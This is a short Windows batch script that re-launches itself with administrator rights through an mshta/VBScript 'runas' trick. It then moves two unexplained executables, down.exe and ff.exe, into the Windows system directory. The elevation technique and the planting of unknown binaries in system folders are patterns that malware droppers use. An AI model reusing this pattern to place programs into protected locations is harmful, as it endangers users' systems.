@echo off
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit

set CURRENT_PATH=%~dp0

move %CURRENT_PATH%down.exe %SystemRoot%
move %CURRENT_PATH%ff.exe %SystemRoot%

timeout 30